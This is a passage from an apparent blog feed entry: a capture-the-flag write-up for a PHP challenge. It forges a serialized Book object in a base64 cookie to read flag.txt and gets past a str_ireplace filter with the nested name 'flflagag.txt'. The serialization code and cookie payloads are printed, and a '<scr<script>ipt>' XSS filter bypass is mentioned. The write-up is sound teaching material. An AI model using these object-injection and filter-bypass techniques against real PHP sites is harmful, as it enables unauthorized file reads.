</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>So, when it undergoes the following code, if <code>$user</code> is an object with the class <code>Book</code>, it would return the contents of its file!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span> Welcome to the Libwary™,  
</span></span><span class="line"><span class="cl">    <span class="cp">&lt;?php 
</span></span></span><span class="line"><span class="cl"><span class="cp">        echo $user;
</span></span></span><span class="line"><span class="cl"><span class="cp">    ?&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- this will return the contents of the file selected,
</span></span></span><span class="line"><span class="cl"><span class="c">    if the variable $user is an object of class Book--&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>This is a potential vulnerability we can make use to print the contents &ldquo;flag.txt&rdquo;. We just need to serialize an object with the class <code>Book</code>, but make <code>$name = 'flag.txt'</code>.</p>
<br>
<h3 id="getting-flagtxt">Getting flag.txt</h3>
<p>We can simulate creating an object with the <code>Book</code> class by simply copy pasting the class and its variables from <code>util.php</code> to our own php compiler (or use <a href="https://onlinephp.io/">this</a> online sandbox).</p>
<p>We can then simply proceed to encode this object via the abovementioned serialization procedure.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Book</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$option</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">print</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Book</span><span class="p">())));</span>
</span></span><span class="line"><span class="cl"><span class="c1">// we can serialize a Book object this way to then put into the cookie
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>Since we did not include a <code>__construct</code> method here, the value of <code>$option</code> doesn&rsquo;t determine the value of <code>$name</code>.</p>
<ul>
<li>When we serialize the <code>$Book</code> object ourselves, the values that are stored are 1) the class name and 2) its variables (ie <code>$option</code>,<code>$name</code>). The methods (eg <code>__construct</code>) will NOT be saved</li>
</ul>
<p>So, why don&rsquo;t we just fix <code>$name</code> to &ldquo;flag.txt&rdquo; by ourselves?</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Book</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$option</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">&#34;flag.txt&#34;</span><span class="p">;</span> <span class="c1">//fix $name to flag.txt
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">print</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Book</span><span class="p">())));</span> <span class="c1">// serialize the Book object
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// Output: Tzo0OiJCb29rIjozOntzOjY6Im9wdGlvbiI7TjtzOjQ6Im5hbWUiO3M6ODoiZmxhZy50eHQiO3M6NzoiY29udGVudCI7Tjt9
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>As such, we have successfully encoded an object which has <code>$name = &quot;flag.txt&quot;</code>.</p>
<p>However, this still wouldn&rsquo;t work due to the final defence in <code>__tostring</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="fm">__tostring</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//final defence [it will remove all occurrences of &#34;flag&#34; in $name]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">!=</span> <span class="s2">&#34;fakeflag.txt&#34;</span><span class="p">)</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//read the file
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;books/&#34;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//make it look nicer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>As such, when printing the object, <code>$name</code> will become <code>&quot;.txt&quot;</code> which leads to an error.</p>
<br>
<h3 id="bypassing-the-final-defence">Bypassing the final defence</h3>
<p>I went to google around for some bypasses of <code>str_ireplace</code> when I passed by <a href="https://www.sevenlayers.com/index.php/blog/398-hackmyvm-connection-walkthrough">this</a> article.</p>
<figure>
    <img src="assets/libwary (5).png" width=70%>
  <figcaption style="text-align:center">A screenshot from the website.</figcaption>
</figure>
<p>In the case of this image, the filtered terms are <code>&lt;script&gt;</code> and <code>&lt;/script&gt;</code>. To bypass the filter, the author embeds <code>&lt;script&gt;</code> in the middle of a <code>&lt;scr</code> and <code>ipt&gt;</code>, forming <code>&lt;scr&lt;script&gt;ipt&gt;</code>.</p>
<p>The filter will remove the <code>&lt;script&gt;</code> in the middle, which combines the <code>&lt;scr</code> and <code>ipt&gt;</code> fragments to form the filtered term!</p>
<br>
<p>Applying this, what we need to do is to put <code>$name = &quot;flflagag.txt&quot;</code>. This way, when the middle <code>&quot;flag&quot;</code> is removed, the 2 fragments at the side will form <code>&quot;flag.txt&quot;</code>!</p>
<p>Let&rsquo;s create a serialized <code>Book</code> object, this time with <code>$name = &quot;flflagag.txt&quot;</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Book</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$option</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">&#34;flflagag.txt&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">print</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Book</span><span class="p">())));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Output: Tzo0OiJCb29rIjozOntzOjY6Im9wdGlvbiI7TjtzOjQ6Im5hbWUiO3M6MTI6ImZsZmxhZ2FnLnR4dCI7czo3OiJjb250ZW50IjtOO30=
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>Let&rsquo;s change out cookie to the output. Reloading the page, we get the flag displayed at the location of the username.</p>
<img src="assets/libwary (6).png">
<p>Flag: <code>ACSI{0mg_th4nks_f0r_r3ading!} </code></p>
]]></content>
        </item>
        
    </channel>
</rss>
